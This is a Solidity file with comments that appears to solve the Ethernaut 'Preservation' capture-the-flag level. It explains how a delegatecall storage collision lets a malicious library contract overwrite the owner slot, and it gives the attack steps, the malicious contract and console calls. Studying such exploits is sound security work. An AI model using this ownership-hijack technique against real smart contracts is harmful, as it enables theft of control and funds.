/*Delegatecall() updates  storage variables on the calling contract using the logic of the callee(called contract)
Research cross-referencing (c++)

Essentially, delegatecall calls the function setTime(),
what's happening is that it is not just applying the logic of setTime() to the storage variables of the calling contract, 
It also preserves the index of storedTime in the calling contract and using this reference as to which variable should it update.
 In short, the LibraryContract is trying to modify the variable at index 0 but on the calling contract, 
 index 0 is the address of timeZone1Library. Thus setTime() to replace timeZone1Library with a malicious contract. 
 In this malicious contract, setTime() then modifies index 2 which on the calling contract is the owner variable!

1)Deploy the malicious library contract
2) Call SetFirstTime() with deployed malicous contract
Now that the address of timeZone1Library has been modified to the malicious contract,
3)call setFirstTime() with the uint value of your player address.
*/

pragma solidity ^0.5.0;

contract LibraryContract {

  // stores a timestamp 
  address index0;
  address index1;
  address index2;

  function setTime(uint _time) public {
    index2 = address(_time);
  }
}

await contract.setFirstTime("address AttackPreservation")
await contract.setFirstTime("player")
